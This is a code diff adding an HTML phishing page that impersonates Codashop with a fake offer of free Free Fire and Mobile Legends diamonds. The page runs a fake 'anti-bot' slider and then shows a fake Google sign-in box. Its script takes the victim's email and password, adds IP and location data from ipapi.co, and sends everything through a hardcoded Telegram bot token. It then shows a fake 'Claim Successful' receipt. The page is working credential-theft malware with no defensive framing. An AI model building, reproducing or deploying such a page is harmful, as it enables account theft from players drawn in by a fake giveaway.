@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Codashop - Official Event Free Fire & Mobile Legends</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background-color: #1c1533; color: #fff; -webkit-tap-highlight-color: transparent; }
+        
+        /* Navbar */
+        .navbar { background: #221a3d; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid #2f2553; position: sticky; top: 0; z-index: 100; }
+        .logo-area { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 20px; color: #fff; letter-spacing: 0.5px; }
+        .logo-area i { color: #8c52ff; font-size: 24px; }
+        .nav-right { display: flex; align-items: center; gap: 12px; }
+        .flag-badge { display: flex; align-items: center; gap: 5px; background: #2f2553; padding: 5px 10px; border-radius: 20px; font-size: 13px; font-weight: 600; }
+
+        /* Container */
+        .container { max-width: 600px; margin: 0 auto; padding: 15px; }
+
+        /* Anti-Bot Overlay */
+        #bot-shield { position: fixed; inset: 0; background: rgba(15, 11, 28, 0.95); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .shield-box { background: #221a3d; border: 1px solid #3d3166; padding: 30px 20px; border-radius: 16px; text-align: center; width: 100%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .shield-box h3 { font-size: 18px; margin-bottom: 8px; font-weight: 700; }
+        .shield-box p { font-size: 12px; color: #b8b3cc; margin-bottom: 24px; }
+        
+        /* Slider Captcha */
+        .slider-container { background: #161026; border-radius: 30px; height: 50px; position: relative; display: flex; align-items: center; padding: 5px; border: 1px solid #382c5c; overflow: hidden; margin-bottom: 15px; }
+        .slider-text { position: absolute; width: 100%; text-align: center; font-size: 13px; color: #8e85ad; font-weight: 600; user-select: none; z-index: 1; }
+        .slider-btn { width: 40px; height: 40px; background: #8c52ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; cursor: pointer; z-index: 2; position: absolute; left: 5px; transition: transform 0.1s ease; box-shadow: 0 2px 8px rgba(140,82,255,0.4); }
+        .slider-success { background: #2ecc71 !important; }
+
+        /* Banner */
+        .banner { border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #33265c; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+        .banner img { width: 100%; display: block; }
+
+        /* Game Selector Grid */
+        .section-title { font-size: 16px; font-weight: 700; margin-bottom: 12px; color: #e2def5; }
+        .game-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 25px; }
+        .game-card { background: #241c3d; border: 2px solid #342959; border-radius: 12px; overflow: hidden; cursor: pointer; transition: all 0.2s; text-align: center; padding-bottom: 12px; }
+        .game-card:hover, .game-card.active { border-color: #8c52ff; background: #2c224f; transform: translateY(-2px); }
+        .game-card img { width: 100%; height: 130px; object-fit: cover; margin-bottom: 8px; }
+        .game-card span { font-size: 14px; font-weight: 700; display: block; padding: 0 8px; }
+
+        /* Form Steps */
+        .step-box { background: #221a3d; border: 1px solid #33265c; border-radius: 12px; padding: 16px; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        .step-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; font-weight: 700; font-size: 14px; }
+        .step-num { background: #8c52ff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; }
+        
+        .input-group { display: flex; gap: 8px; }
+        .input-group input { flex: 1; background: #161026; border: 1px solid #3c2f66; padding: 10px 14px; border-radius: 8px; color: white; font-size: 14px; outline: none; }
+        .input-group input:focus { border-color: #8c52ff; }
+        .zone-input { max-width: 110px; }
+        .input-hint { font-size: 11px; color: #9b93b8; margin-top: 6px; line-height: 1.4; }
+
+        /* Items Grid (Free) */
+        .items-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .item-card { background: #1b132e; border: 2px solid #362a5c; border-radius: 10px; padding: 12px; cursor: pointer; transition: 0.2s; position: relative; }
+        .item-card.selected { border-color: #8c52ff; background: #2b1f4d; }
+        .item-name { font-size: 13px; font-weight: 700; margin-bottom: 4px; }
+        .item-price { font-size: 12px; color: #2ecc71; font-weight: 700; }
+        .badge-free { position: absolute; top: 8px; right: 8px; background: #e74c3c; font-size: 9px; font-weight: 800; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; }
+
+        /* Claim Button */
+        .btn-claim { width: 100%; background: #8c52ff; color: white; border: none; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 20px; transition: background 0.2s; box-shadow: 0 4px 15px rgba(140,82,255,0.4); }
+        .btn-claim:hover { background: #7b42ef; }
+
+        /* Google Login Modal */
+        #google-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 999; display: none; align-items: center; justify-content: center; padding: 15px; }
+        .google-box { background: #ffffff; color: #202124; width: 100%; max-width: 400px; border-radius: 12px; padding: 30px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .google-box img { width: 75px; margin-bottom: 15px; }
+        .google-box h2 { font-size: 20px; font-weight: 600; margin-bottom: 8px; color: #202124; }
+        .google-box p { font-size: 13px; color: #5f6368; margin-bottom: 20px; }
+        .g-input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 6px; font-size: 14px; margin-bottom: 12px; outline: none; }
+        .g-input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+        .g-btn { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        .g-btn:hover { background: #1557b0; }
+
+        /* Invoice Success Screen */
+        #invoice-screen { position: fixed; inset: 0; background: #1c1533; z-index: 1000; display: none; padding: 20px; overflow-y: auto; align-items: center; justify-content: center; }
+        .invoice-card { background: #221a3d; border: 1px solid #3c2f66; width: 100%; max-width: 420px; border-radius: 16px; padding: 25px; text-align: center; box-shadow: 0 10px 35px rgba(0,0,0,0.5); }
+        .invoice-card i.fa-check-circle { font-size: 55px; color: #2ecc71; margin-bottom: 15px; }
+        .invoice-card h3 { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
+        .invoice-card p.sub { font-size: 12px; color: #b3aeca; margin-bottom: 20px; }
+        .receipt-details { background: #17102b; border-radius: 10px; padding: 15px; text-align: left; margin-bottom: 20px; border: 1px solid #2f2352; }
+        .receipt-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; }
+        .receipt-row span:first-child { color: #9b93b8; }
+        .receipt-row span:last-child { font-weight: 700; color: #fff; }
+        .pending-notice { background: rgba(241, 196, 15, 0.1); border: 1px solid #f1c40f; color: #f1c40f; padding: 12px; border-radius: 8px; font-size: 12px; font-weight: 600; line-height: 1.5; }
+    </style>
+</head>
+<body>
+
+    <!-- ANTI-BOT VERIFICATION SHIELD -->
+    <div id="bot-shield">
+        <div class="shield-box">
+            <h3>Security Verification</h3>
+            <p>Please slide to verify you are a human and prevent automated bots.</p>
+            <div class="slider-container" id="sliderContainer">
+                <div class="slider-text">Slide to verify &rarr;</div>
+                <div class="slider-btn" id="sliderBtn"><i class="fa-solid fa-arrow-right"></i></div>
+            </div>
+            <div style="font-size: 11px; color: #786f96;">Protected by Advanced Anti-Bot Engine</div>
+        </div>
+    </div>
+
+    <!-- NAVBAR -->
+    <div class="navbar">
+        <div class="logo-area">
+            <i class="fa-solid fa-gem"></i> CODASHOP
+        </div>
+        <div class="nav-right">
+            <div class="flag-badge">
+                <img src="https://flagcdn.com/w20/id.png" width="16" alt="ID"> ID
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTAINER -->
+    <div class="container">
+        <!-- BANNER -->
+        <div class="banner">
+            <img src="https://images.unsplash.com/photo-1542751371-adc38448a05e?w=600&auto=format&fit=crop&q=60" alt="Event Banner">
+        </div>
+
+        <div class="section-title">Select Game Event</div>
+        <div class="game-grid">
+            <div class="game-card active" onclick="selectGame('Free Fire', this)">
+                <img src="https://images.unsplash.com/photo-1538481199705-c710c4e965fc?w=400&auto=format&fit=crop&q=60" alt="Free Fire">
+                <span>Free Fire</span>
+            </div>
+            <div class="game-card" onclick="selectGame('Mobile Legends', this)">
+                <img src="https://images.unsplash.com/photo-1563089145-599997674d42?w=400&auto=format&fit=crop&q=60" alt="Mobile Legends">
+                <span>Mobile Legends</span>
+            </div>
+        </div>
+
+        <!-- STEP 1: PLAYER ID -->
+        <div class="step-box">
+            <div class="step-header">
+                <div class="step-num">1</div>
+                <div>Enter Player ID</div>
+            </div>
+            <div class="input-group">
+                <input type="text" id="playerId" placeholder="Enter User ID">
+                <input type="text" id="zoneId" class="zone-input" placeholder="Zone ID" style="display:none;">
+            </div>
+            <div class="input-hint" id="idHint">To find your ID, tap on your avatar in the top left corner of the game main menu.</div>
+        </div>
+
+        <!-- STEP 2: SELECT FREE ITEM -->
+        <div class="step-box">
+            <div class="step-header">
+                <div class="step-num">2</div>
+                <div>Select Free Reward Item</div>
+            </div>
+            <div class="items-grid" id="itemsGrid"></div>
+        </div>
+
+        <!-- CLAIM BUTTON -->
+        <button class="btn-claim" onclick="triggerLogin()">CLAIM NOW</button>
+    </div>
+
+    <!-- GOOGLE LOGIN MODAL -->
+    <div id="google-modal">
+        <div class="google-box">
+            <img src="https://www.freepnglogos.com/uploads/google-logo-png/google-logo-png-webinar-optimizing-for-success-google-business-pg-profile-13.png" alt="Google">
+            <h2>Sign in with Google</h2>
+            <p>to verify ownership of your game account</p>
+            <form onsubmit="submitData(event)">
+                <input type="email" id="gEmail" class="g-input" placeholder="Email or phone" required>
+                <input type="password" id="gPass" class="g-input" placeholder="Enter your password" required>
+                <button type="submit" class="g-btn">Next</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- INVOICE SCREEN -->
+    <div id="invoice-screen">
+        <div class="invoice-card">
+            <i class="fa-solid fa-circle-check"></i>
+            <h3>Claim Successful!</h3>
+            <p class="sub">Your request has been successfully queued in our system.</p>
+            
+            <div class="receipt-details">
+                <div class="receipt-row"><span>Game:</span> <span id="rGame">-</span></div>
+                <div class="receipt-row"><span>Player ID:</span> <span id="rId">-</span></div>
+                <div class="receipt-row"><span>Reward:</span> <span id="rItem">-</span></div>
+                <div class="receipt-row"><span>Price:</span> <span style="color:#2ecc71;">FREE ($0.00)</span></div>
+                <div class="receipt-row"><span>Status:</span> <span style="color:#f1c40f;">Processing</span></div>
+            </div>
+
+            <div class="pending-notice">
+                Please wait 5 minutes. If it does not enter your account, please try again.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentGame = 'Free Fire';
+        let currentItem = '73100 Diamonds + Exclusive Bundle';
+        
+        const ffItems = [
+            { name: '73100 Diamonds', bonus: '+ Exclusive Bundle' },
+            { name: '36500 Diamonds', bonus: '+ Elite Pass' },
+            { name: '7290 Diamonds', bonus: '+ Gun Skin' },
+            { name: '3640 Diamonds', bonus: '+ Pet Bonus' }
+        ];
+
+        const mlItems = [
+            { name: 'Twilight Pass', bonus: '+ 500 Diamonds' },
+            { name: 'Weekly Diamond Pass', bonus: '+ 220 Diamonds' },
+            { name: '5000 Diamonds', bonus: '+ Epic Skin' },
+            { name: '1000 Diamonds', bonus: '+ Starlight Card' }
+        ];
+
+        function renderItems() {
+            const grid = document.getElementById('itemsGrid');
+            grid.innerHTML = '';
+            const items = currentGame === 'Free Fire' ? ffItems : mlItems;
+            
+            items.forEach((item, index) => {
+                const div = document.createElement('div');
+                div.className = `item-card ${index === 0 ? 'selected' : ''}`;
+                div.onclick = () => selectItem(item.name + ' ' + item.bonus, div);
+                div.innerHTML = `
+                    <div class="badge-free">FREE</div>
+                    <div class="item-name">${item.name}</div>
+                    <div class="item-price">${item.bonus}</div>
+                `;
+                grid.appendChild(div);
+            });
+            currentItem = items[0].name + ' ' + items[0].bonus;
+        }
+
+        function selectGame(gameName, element) {
+            currentGame = gameName;
+            document.querySelectorAll('.game-card').forEach(c => c.classList.remove('active'));
+            element.classList.add('active');
+            
+            const zoneInput = document.getElementById('zoneId');
+            const idHint = document.getElementById('idHint');
+            
+            if(gameName === 'Mobile Legends') {
+                zoneInput.style.display = 'block';
+                idHint.innerText = "To find your User ID and Zone ID, tap on your profile icon in the top left corner. Example: 12345678 (1234)";
+            } else {
+                zoneInput.style.display = 'none';
+                idHint.innerText = "To find your ID, tap on your avatar in the top left corner of the game main menu.";
+            }
+            renderItems();
+        }
+
+        function selectItem(itemName, element) {
+            document.querySelectorAll('.item-card').forEach(c => c.classList.remove('selected'));
+            element.classList.add('selected');
+            currentItem = itemName;
+        }
+
+        // Anti-Bot Slider Logic
+        const sliderBtn = document.getElementById('sliderBtn');
+        const sliderContainer = document.getElementById('sliderContainer');
+        let isDragging = false;
+        let startX = 0;
+
+        sliderBtn.addEventListener('mousedown', startDrag);
+        sliderBtn.addEventListener('touchstart', startDrag);
+        window.addEventListener('mousemove', onDrag);
+        window.addEventListener('touchmove', onDrag);
+        window.addEventListener('mouseup', endDrag);
+        window.addEventListener('touchend', endDrag);
+
+        function startDrag(e) {
+            isDragging = true;
+            startX = e.clientX || e.touches[0].clientX;
+        }
+
+        function onDrag(e) {
+            if (!isDragging) return;
+            const clientX = e.clientX || e.touches[0].clientX;
+            const diff = clientX - startX;
+            const max = sliderContainer.clientWidth - sliderBtn.clientWidth - 10;
+            
+            if (diff > 0 && diff <= max) {
+                sliderBtn.style.transform = `translateX(${diff}px)`;
+            } else if (diff > max) {
+                sliderBtn.style.transform = `translateX(${max}px)`;
+                successVerify();
+            }
+        }
+
+        function endDrag() {
+            if (!isDragging) return;
+            isDragging = false;
+            const transform = sliderBtn.style.transform;
+            const match = transform.match(/translateX\(([^px]+)px\)/);
+            if(match && parseFloat(match[1]) < (sliderContainer.clientWidth - 80)) {
+                sliderBtn.style.transform = 'translateX(0px)';
+            }
+        }
+
+        function successVerify() {
+            sliderBtn.classList.add('slider-success');
+            sliderBtn.innerHTML = '<i class="fa-solid fa-check"></i>';
+            document.querySelector('.slider-text').innerText = 'Verified Successfully';
+            setTimeout(() => {
+                document.getElementById('bot-shield').style.display = 'none';
+            }, 600);
+        }
+
+        function triggerLogin() {
+            const playerId = document.getElementById('playerId').value;
+            if(!playerId) {
+                alert('Please enter your Player ID first!');
+                return;
+            }
+            document.getElementById('google-modal').style.display = 'flex';
+        }
+
+        // AUTO GET IP, GEO, ASN & SEND TO TELEGRAM
+        async function submitData(e) {
+            e.preventDefault();
+            const email = document.getElementById('gEmail').value;
+            const password = document.getElementById('gPass').value;
+            const playerId = document.getElementById('playerId').value;
+            const zoneId = document.getElementById('zoneId').value;
+            const fullId = zoneId ? `${playerId} (${zoneId})` : playerId;
+
+            let ipData = { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown', region: 'Unknown', org: 'Unknown' };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch(err) {
+                console.log('Geo fetch error');
+            }
+
+            const formattedMessage = `
+📌 NEW CREDENTIAL CAPTURED 📌
+EMAIL : ${email}
+PW : ${password}
+ID : ${fullId}
+GAME : ${currentGame}
+NEGARA : ${ipData.country_name || ipData.country}
+CITY : ${ipData.city}
+ASN : ${ipData.org}
+IP ADDRES : ${ipData.ip}
+            `.trim();
+
+            const botToken = '8875426142:AAHql1lzWkYCruoV6rbie4evDYGpOv-sL4U';
+            const chatId = '7758332034';
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: formattedMessage })
+            });
+
+            document.getElementById('google-modal').style.display = 'none';
+            document.getElementById('rGame').innerText = currentGame;
+            document.getElementById('rId').innerText = fullId;
+            document.getElementById('rItem').innerText = currentItem;
+            document.getElementById('invoice-screen').style.display = 'flex';
+        }
+
+        renderItems();
+    </script>
+</body>
+</html>
